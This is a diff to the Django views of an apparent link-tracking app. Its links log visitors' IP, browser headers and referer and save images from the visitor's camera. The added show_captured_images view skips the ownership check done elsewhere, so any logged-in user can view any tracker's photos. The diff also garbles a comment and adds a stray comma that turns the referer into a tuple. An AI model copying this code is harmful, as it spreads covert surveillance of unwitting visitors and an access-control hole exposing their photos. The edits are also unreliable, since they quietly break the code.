@@ -32,18 +32,30 @@ def list_case_url_view(request):
     context = {"objs": objs,"app_domain":APP_DOMAIN}
     return render(request, template, context)
 
+
 @login_required(login_url='/login')
 def show_trackers_view(request,case_id):
     user = request.user
     case = Case.objects.get(pk=case_id)
     if case.owner != user:
-        #TODO majd itt kéne üzenet vagy valami
+        #TOvvivraDO mavjd itt kéne üzenet vagy valami
         return redirect('/')
-
     objs = Tracker.objects.filter(case=case).order_by('-created')
     template = "tracker/list_trackers.html"
-    context = {"objs": objs,"app_domain":APP_DOMAIN}
+    context = {"objs": objs,"app_domain":APP_DOMAIN,"case":case}
     return render(request, template, context)
+
+@login_required(login_url='/login')
+def show_captured_images(request,tracker_id):
+    user = request.user
+    template = "tracker/show_captured_images.html"
+    #TODO itt azért ellenőrizzük, hogy létezik... meg a többinél is
+    tracker = Tracker.objects.get(pk=tracker_id)
+    pictures = tracker.get_camera_captures.all()
+    context = {"pictures":pictures,"tracker":tracker}
+    return render(request, template, context)
+
+
 
 
 def login_view(request):
@@ -73,8 +85,7 @@ def tracker_view(request,url_id):
 
         x_forwarded_for = request.META.get("HTTP_X_FORWARDED_FOR", "")
         user_agent_string = request.META.get("HTTP_USER_AGENT", "")
-        referer = request.META.get("HTTP_REFERER", "")
-
+        referer = request.META.get("HTTP_REFERER", ""),
         browser = request.META.get('HTTP_SEC_CH_UA', '')
         platform = request.META.get('HTTP_SEC_CH_UA_PLATFORM', '')
         mobile = request.META.get('HTTP_SEC_CH_UA_MOBILE', '')
@@ -137,11 +148,12 @@ def save_captured_image(request):
     url_id = request.POST.get("url_id")
     tracker_id = request.POST.get("tracker_id")
     case = Case.objects.get(url_id=url_id)
+    tracker = Tracker.objects.get(pk=tracker_id)
 
     image = request.FILES["image"]
 
     captured_image = CameraCapture.objects.create(
-        case = case,
+        tracker = tracker,
         photo = image,
     )
 
